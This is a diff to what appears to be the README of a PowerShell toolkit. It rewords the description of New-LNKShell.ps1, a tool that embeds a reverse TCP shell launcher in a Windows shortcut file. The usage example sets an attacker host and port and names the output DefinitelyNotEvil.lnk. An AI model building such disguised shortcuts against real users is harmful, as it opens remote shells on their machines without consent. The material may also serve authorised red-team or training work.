@@ -41,7 +41,7 @@ Get-Substring -Start 'The quick' -End 'lazy dog' -Path C:\StoryAboutAFox.txt
 ```
 
 ##New-LNKShell.ps1
-Creates a reverse TCP stager embedded in a LNK file.
+Creates a reverse TCP shell launcher embedded in a LNK file.
 
 ```
 New-LNKShell -LHOST 192.168.1.1 -LPORT -1234 -OutPath C:\Path\To\My\Shell -Filename DefinitelyNotEvil.lnk
